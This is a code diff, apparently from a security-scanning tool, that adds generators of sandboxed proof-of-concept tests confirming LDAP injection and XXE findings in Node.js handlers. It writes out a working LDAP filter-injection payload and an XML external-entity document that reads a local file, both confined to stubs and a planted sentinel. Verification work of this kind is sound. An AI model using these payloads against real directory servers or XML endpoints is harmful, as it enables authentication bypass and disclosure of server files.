@@ -44,6 +44,8 @@ export const SUPPORTED = new Set([
   'webhook-missing-signature-verification',
   'sql-injection',
   'path-traversal',
+  'ldap-injection',
+  'xxe',
 ]);
 
 // Classes proven by observing the HANDLER's behaviour rather than a payload
@@ -53,6 +55,8 @@ const BEHAVIOURAL = new Map([
   ['webhook-missing-signature-verification', (f, c) => _webhookPoc(f, c)],
   ['sql-injection', (f, c) => _sqlInjectionPoc(f, c)],
   ['path-traversal', (f, c) => _pathTraversalPoc(f, c)],
+  ['ldap-injection', (f, c) => _ldapInjectionPoc(f, c)],
+  ['xxe', (f, c) => _xxePoc(f, c)],
 ]);
 
 // Classes deliberately NOT here, with the reason, so the gap is a decision
@@ -490,6 +494,218 @@ function _sqlInjectionPoc(finding, fileContent) {
 // whose FAILURE would be about the harness.
 const TRAVERSAL_SENTINEL = 'PROVEN_TRAVERSAL_SENTINEL_CONTENT';
 const READ_SINK = /\b(?:readFile|readFileSync|sendFile|readFileAsync)\s*\(/;
+
+
+// ── LDAP injection (CWE-90) ────────────────────────────────────────────────
+//
+// Added because `ldap-injection` was the largest UNCLASSIFIED family in the
+// published proof-coverage breakdown (10 of 280 corpus findings) and it has the
+// same property that makes SQL provable: a decidable boundary where the
+// question is settled without a running directory server.
+//
+// For SQL the question is "did the payload arrive as query TEXT or as a bound
+// parameter". For LDAP it is "did the payload's filter METACHARACTERS survive".
+// A correctly escaped value still contains the sentinel — `ldap_escape`,
+// `EqualityFilter` and friends escape `(`, `)`, `*` and `\` to `\28`, `\29`,
+// `\2a`, `\5c` — so matching the sentinel alone would call a FIXED handler
+// vulnerable. The proof requires the sentinel AND an unescaped metacharacter in
+// the same filter string.
+const LDAP_SENTINEL = 'PROVEN_LDAPI';
+// RELATIVE, like SQL_LOG. An absolute path (/tmp/...) is denied by the
+// confinement backend, so the recorder silently wrote nothing and the proof
+// came back proof-failed on a genuinely vulnerable handler — the sandbox
+// working exactly as intended, and a reminder that a PoC must live entirely
+// inside the sandbox root.
+const LDAP_LOG = 'ldap-calls.jsonl';
+const LDAP_DRIVERS = ['ldapjs', 'ldap-authentication', 'activedirectory', 'activedirectory2', 'ldapts'];
+const LDAP_DRIVER_RES = LDAP_DRIVERS.map((d) => [
+  d, new RegExp(`require\\(\\s*['"\`]${d}['"\`]|from\\s*['"\`]${d}['"\`]`),
+]);
+
+const LDAP_STUB = [
+  "const fs = require('fs');",
+  'function record(args) {',
+  '  const filters = [];',
+  '  for (const a of args) {',
+  "    if (typeof a === 'string') filters.push(a);",
+  "    else if (a && typeof a === 'object') {",
+  "      if (typeof a.filter === 'string') filters.push(a.filter);",
+  "      if (a.filter && typeof a.filter === 'object' && typeof a.filter.toString === 'function') filters.push(String(a.filter));",
+  '    }',
+  '  }',
+  '  if (filters.length) {',
+  `    try { fs.appendFileSync(${JSON.stringify(LDAP_LOG)}, JSON.stringify({ filters }) + '\\n'); } catch {}`,
+  '  }',
+  '}',
+  'const mk = () => new Proxy(function () {}, {',
+  "  get(t, p) { if (typeof p === 'symbol' || p === 'then' || p === 'inspect') return undefined; return mk(); },",
+  '  apply(t, self, args) {',
+  '    record(args);',
+  "    for (const a of args) if (typeof a === 'function') { try { a(null, { on: () => {} }); } catch {} }",
+  '    return mk();',
+  '  },',
+  '});',
+  'module.exports = mk();',
+].join('\n');
+
+function _ldapInjectionPoc(finding, fileContent) {
+  const driver = (LDAP_DRIVER_RES.find(([, re]) => re.test(fileContent)) || [])[0];
+  if (!driver) {
+    return {
+      ok: false,
+      reason: `no recognised LDAP client is required by this file, so there is no boundary to observe the filter at (looked for: ${LDAP_DRIVERS.join(', ')})`,
+    };
+  }
+  const found = _findHandler(fileContent);
+  if (!found) return NO_HANDLER;
+  const { call, reqIdent } = found;
+
+  const src = _requestSource(fileContent, reqIdent, finding.line);
+  if (!src) {
+    return { ok: false, reason: `the handler does not read query/body/params off '${reqIdent}', so the injection point is unknown` };
+  }
+
+  const { base, importLine, invoke, handlerLabel } = _binding(finding, call);
+  // Filter metacharacters plus the sentinel. An escaping handler keeps the
+  // sentinel and neutralises the parens/star, which is exactly the difference
+  // the decision below reads.
+  const payload = `*)(uid=*))(|(uid=*${LDAP_SENTINEL}`;
+  // The distinctive raw tail of that payload. Present verbatim only if no
+  // escaping happened between the request and the client.
+  const RAW_TAIL = `)(|(uid=*${LDAP_SENTINEL}`;
+
+  const code = [
+    `// Auto-generated proof for ${finding.file}.`,
+    `// Stubs the '${driver}' client with a recorder and calls the handler with a`,
+    '// payload carrying LDAP filter metacharacters. The marker is written only if',
+    '// those metacharacters reached the filter UNESCAPED — an escaped value still',
+    '// carries the sentinel, so the sentinel alone proves nothing.',
+    importLine,
+    "import fs from 'node:fs';",
+    'await new Promise((resolve) => {',
+    '  let timer = null;',
+    '  const done = () => { clearTimeout(timer); resolve(); };',
+    '  const res = {',
+    '    send: done, json: done, end: done,',
+    '    status: () => ({ send: done, json: done, end: done }),',
+    '  };',
+    `  const req = { ${src.prop}: ${JSON.stringify({ [src.key]: payload })} };`,
+    '  timer = setTimeout(resolve, 3000);',
+    `  try { ${invoke}(req, res); } catch { done(); }`,
+    '});',
+    '',
+    '// The whole decision, stated once: did the PAYLOAD\'s OWN metacharacters',
+    '// survive verbatim? Looking for any raw paren near the sentinel does not',
+    '// work — the application\'s filter template (\'(uid=\' + v + \')\') always',
+    '// contributes raw parens of its own, so that test called an ESCAPING',
+    '// handler vulnerable. Escaping rewrites the payload tail to \\2a\\29\\28…,',
+    '// so its verbatim presence is the bug and its absence is the fix working.',
+    'let proven = false;',
+    'try {',
+    `  for (const line of fs.readFileSync(${JSON.stringify(LDAP_LOG)}, 'utf8').split('\\n')) {`,
+    '    if (!line.trim()) continue;',
+    '    const rec = JSON.parse(line);',
+    `    for (const f of rec.filters) if (f.includes(${JSON.stringify(RAW_TAIL)})) proven = true;`,
+    '  }',
+    '} catch {}',
+    `if (proven) fs.writeFileSync('${MARKER}', 'x');`,
+  ].join('\n');
+
+  return {
+    ok: true,
+    poc: {
+      lang: 'js', kind: 'in-process', family: finding.family, cwe: finding.cwe || null,
+      marker: MARKER, paramKey: src.key, paramSource: src.prop, handler: handlerLabel,
+      driver,
+      observes: 'the request payload reached the LDAP client with its filter metacharacters unescaped',
+      requires: [base],
+      extraFiles: { [`node_modules/${driver}/index.js`]: LDAP_STUB },
+      code,
+    },
+  };
+}
+
+
+// ── XXE (CWE-611) ──────────────────────────────────────────────────────────
+//
+// The third-largest unclassified family in the published proof-coverage
+// breakdown. It is provable in-process for a reason the SSRF class is NOT: the
+// external entity can point at a LOCAL file the harness plants inside the
+// sandbox, so the proof needs no network and a failed fetch can never be
+// confinement talking.
+//
+// The decision is whether the parser RESOLVED the entity. The sentinel content
+// lives only in a file the XML never contains, so its presence in the parsed
+// output means the parser went and read it — which is the vulnerability. A
+// parser with entity expansion off returns the entity unexpanded (or throws),
+// and neither writes the marker.
+const XXE_SENTINEL = 'PROVEN_XXE_ENTITY_RESOLVED';
+const XXE_SENTINEL_FILE = 'xxe-sentinel.txt';
+const XXE_PARSERS = ['libxmljs', 'libxmljs2', '@xmldom/xmldom', 'xmldom', 'node-expat'];
+const XXE_PARSER_RES = XXE_PARSERS.map((d) => [
+  d, new RegExp(`require\\(\\s*['"\`]${d.replace('/', '\\/')}['"\`]|from\\s*['"\`]${d.replace('/', '\\/')}['"\`]`),
+]);
+
+function _xxePoc(finding, fileContent) {
+  const parser = (XXE_PARSER_RES.find(([, re]) => re.test(fileContent)) || [])[0];
+  if (!parser) {
+    return {
+      ok: false,
+      reason: `no recognised XML parser is required by this file, so there is nothing to observe entity resolution at (looked for: ${XXE_PARSERS.join(', ')})`,
+    };
+  }
+  const found = _findHandler(fileContent);
+  if (!found) return NO_HANDLER;
+  const { call, reqIdent } = found;
+
+  const src = _requestSource(fileContent, reqIdent, finding.line);
+  if (!src) {
+    return { ok: false, reason: `the handler does not read query/body/params off '${reqIdent}', so the XML entry point is unknown` };
+  }
+
+  const { base, importLine, invoke, handlerLabel } = _binding(finding, call);
+  const xml = `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file://./${XXE_SENTINEL_FILE}">]><r>&x;</r>`;
+
+  const code = [
+    `// Auto-generated proof for ${finding.file}.`,
+    '// Plants a sentinel file, hands the handler XML whose external entity points',
+    '// at it, and writes the marker only if the SENTINEL CONTENT comes back —',
+    '// which can only happen if the parser resolved the entity and read the file.',
+    '// A parser with entity expansion disabled returns it unexpanded or throws.',
+    importLine,
+    "import fs from 'node:fs';",
+    `fs.writeFileSync(${JSON.stringify(XXE_SENTINEL_FILE)}, ${JSON.stringify(XXE_SENTINEL)});`,
+    'let seen = "";',
+    'await new Promise((resolve) => {',
+    '  let timer = null;',
+    '  const capture = (v) => { try { seen += typeof v === "string" ? v : JSON.stringify(v); } catch {} clearTimeout(timer); resolve(); };',
+    '  const res = {',
+    '    send: capture, json: capture, end: capture,',
+    '    status: () => ({ send: capture, json: capture, end: capture }),',
+    '  };',
+    `  const req = { ${src.prop}: ${JSON.stringify({ [src.key]: xml })} };`,
+    '  timer = setTimeout(resolve, 3000);',
+    `  try { const r = ${invoke}(req, res); if (r && typeof r.then === "function") r.then(capture, () => resolve()); } catch { resolve(); }`,
+    '});',
+    '',
+    '// The whole decision, stated once: the sentinel STRING is only reachable by',
+    '// reading the planted file. Matching the entity name or the XML itself would',
+    '// be satisfied by a parser that never expanded anything.',
+    `if (seen.includes(${JSON.stringify(XXE_SENTINEL)})) fs.writeFileSync('${MARKER}', 'x');`,
+  ].join('\n');
+
+  return {
+    ok: true,
+    poc: {
+      lang: 'js', kind: 'in-process', family: finding.family, cwe: finding.cwe || null,
+      marker: MARKER, paramKey: src.key, paramSource: src.prop, handler: handlerLabel,
+      driver: parser,
+      observes: 'the XML parser resolved an external entity and returned the contents of a local file',
+      requires: [base],
+      code,
+    },
+  };
+}
 
 function _pathTraversalPoc(finding, fileContent) {
   const found = _findHandler(fileContent);
